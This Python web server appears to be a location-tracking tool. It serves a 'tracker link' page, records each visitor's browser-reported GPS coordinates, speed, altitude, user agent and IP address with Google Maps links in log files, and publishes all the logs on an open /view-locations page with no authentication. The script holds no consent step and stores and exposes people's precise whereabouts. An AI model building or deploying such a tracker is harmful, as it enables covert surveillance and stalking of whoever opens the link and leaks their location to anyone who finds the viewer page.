from http.server import HTTPServer, BaseHTTPRequestHandler
import json
from datetime import datetime
import os

PORT = int(os.environ.get('PORT', 8080))  # Use Render's PORT or default to 8080

# Create logs directory if it doesn't exist
LOGS_DIR = 'logs'
if not os.path.exists(LOGS_DIR):
    os.makedirs(LOGS_DIR)

class LocationHandler(BaseHTTPRequestHandler):
    def save_location_to_log(self, location_data, client_ip):
        """Save location data to log file"""
        try:
            # Create log filename with current date
            log_filename = datetime.now().strftime('%Y-%m-%d') + '.log'
            log_filepath = os.path.join(LOGS_DIR, log_filename)
            
            # Determine location source based on accuracy
            accuracy = location_data.get('accuracy', 0)
            if accuracy <= 20:
                source = 'GPS'
            elif accuracy <= 100:
                source = 'WiFi/GPS Hybrid'
            elif accuracy <= 1000:
                source = 'WiFi/Cell Tower'
            else:
                source = 'IP Address'
            
            # Create detailed log entry
            log_entry = f"""
{'='*80}
Timestamp: {location_data.get('timestamp')}
Source: {source}
Latitude: {location_data.get('latitude')}
Longitude: {location_data.get('longitude')}
Accuracy: {location_data.get('accuracy')} meters
Altitude: {location_data.get('altitude', 'N/A')}
Altitude Accuracy: {location_data.get('altitudeAccuracy', 'N/A')}
Heading: {location_data.get('heading', 'N/A')}
Speed: {location_data.get('speed', 'N/A')}
User Agent: {location_data.get('userAgent', 'Unknown')}
IP Address: {client_ip}
Google Maps Link: https://www.google.com/maps?q={location_data.get('latitude')},{location_data.get('longitude')}
{'='*80}

"""
            
            # Append to log file
            with open(log_filepath, 'a', encoding='utf-8') as log_file:
                log_file.write(log_entry)
            
            print(f"✅ Location saved to {log_filepath}")
            print(f"   Coordinates: {location_data.get('latitude')}, {location_data.get('longitude')}")
            print(f"   Source: {source}, Accuracy: {accuracy}m")
            return True
                
        except Exception as e:
            print(f"❌ Error saving location to log: {e}")
            return False
    
    def do_GET(self):
        # Remove query parameters from path
        path = self.path.split('?')[0]
        
        if path == '/' or path == '':
            # Serve the HTML page
            self.send_response(200)
            self.send_header('Content-type', 'text/html')
            self.end_headers()
            with open('index.html', 'rb') as file:
                self.wfile.write(file.read())
        
        elif path == '/view-locations':
            # Show all log files
            self.send_response(200)
            self.send_header('Content-type', 'text/html')
            self.end_headers()
            
            try:
                # Get all log files
                log_files = sorted([f for f in os.listdir(LOGS_DIR) if f.endswith('.log')], reverse=True)
                
                html = f"""
                <html>
                    <head>
                        <title>Location Logs</title>
                        <style>
                            body {{ font-family: Arial, sans-serif; padding: 20px; background: #f5f5f5; }}
                            .container {{ max-width: 800px; margin: 0 auto; background: white; 
                                         padding: 30px; border-radius: 10px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); }}
                            h1 {{ color: #333; }}
                            .log-list {{ list-style: none; padding: 0; }}
                            .log-item {{ padding: 15px; margin: 10px 0; background: #f8f9fa; 
                                        border-radius: 5px; border-left: 4px solid #007bff; }}
                            .log-item a {{ text-decoration: none; color: #007bff; font-weight: bold; }}
                            .log-item a:hover {{ text-decoration: underline; }}
                            .info {{ background: #d1ecf1; padding: 15px; border-radius: 5px; margin: 20px 0; }}
                            .empty {{ text-align: center; padding: 40px; color: #666; }}
                        </style>
                    </head>
                    <body>
                        <div class="container">
                            <h1>� Location Logs</h1>
                            <div class="info">
                                <strong>Total Log Files:</strong> {len(log_files)}<br>
                                <strong>Logs Directory:</strong> {LOGS_DIR}/
                            </div>
                """
                
                if log_files:
                    html += '<ul class="log-list">'
                    for log_file in log_files:
                        file_path = os.path.join(LOGS_DIR, log_file)
                        file_size = os.path.getsize(file_path)
                        file_size_kb = file_size / 1024
                        
                        # Count entries (approximate)
                        with open(file_path, 'r', encoding='utf-8') as f:
                            content = f.read()
                            entry_count = content.count('='*80) // 2
                        
                        html += f'''
                            <li class="log-item">
                                <a href="/view-log/{log_file}">📄 {log_file}</a><br>
                                <small>Size: {file_size_kb:.1f} KB | Entries: {entry_count}</small>
                            </li>
                        '''
                    html += '</ul>'
                else:
                    html += '<div class="empty">No location logs yet. Open the tracker link to capture locations!</div>'
                
                html += """
                        </div>
                    </body>
                </html>
                """
                
                self.wfile.write(html.encode())
            except Exception as e:
                error_html = f"<html><body><h1>Error</h1><p>{str(e)}</p></body></html>"
                self.wfile.write(error_html.encode())
        
        elif path.startswith('/view-log/'):
            # View specific log file
            log_filename = path.replace('/view-log/', '')
            log_filepath = os.path.join(LOGS_DIR, log_filename)
            
            if os.path.exists(log_filepath) and log_filename.endswith('.log'):
                self.send_response(200)
                self.send_header('Content-type', 'text/plain; charset=utf-8')
                self.end_headers()
                with open(log_filepath, 'r', encoding='utf-8') as file:
                    self.wfile.write(file.read().encode('utf-8'))
            else:
                self.send_error(404, 'Log file not found')
        
        else:
            self.send_error(404)
    
    def do_POST(self):
        if self.path == '/save-location':
            # Read the posted data
            content_length = int(self.headers['Content-Length'])
            post_data = self.rfile.read(content_length)
            location_data = json.loads(post_data.decode('utf-8'))
            
            # Save to log file
            try:
                log_saved = self.save_location_to_log(location_data, self.client_address[0])
                
                if log_saved:
                    # Send success response
                    self.send_response(200)
                    self.send_header('Content-type', 'application/json')
                    self.end_headers()
                    response = {'success': True, 'message': 'Location saved to log successfully'}
                    self.wfile.write(json.dumps(response).encode())
                else:
                    self.send_response(500)
                    self.send_header('Content-type', 'application/json')
                    self.end_headers()
                    response = {'success': False, 'error': 'Failed to save location'}
                    self.wfile.write(json.dumps(response).encode())
            
            except Exception as e:
                print(f"❌ Error processing location: {e}")
                self.send_response(500)
                self.send_header('Content-type', 'application/json')
                self.end_headers()
                response = {'success': False, 'error': str(e)}
                self.wfile.write(json.dumps(response).encode())
        
        else:
            self.send_error(404)

def run(server_class=HTTPServer, handler_class=LocationHandler, port=PORT):
    server_address = ('0.0.0.0', port)  # Listen on all interfaces for Render
    httpd = server_class(server_address, handler_class)
    print(f'Server is running on port {port}')
    print(f'View saved locations at: /view-locations')
    print('Press Ctrl+C to stop the server')
    print('\nKeep this window open to keep the server running!')
    try:
        httpd.serve_forever()
    except KeyboardInterrupt:
        print('\nServer stopped.')

if __name__ == '__main__':
    run()
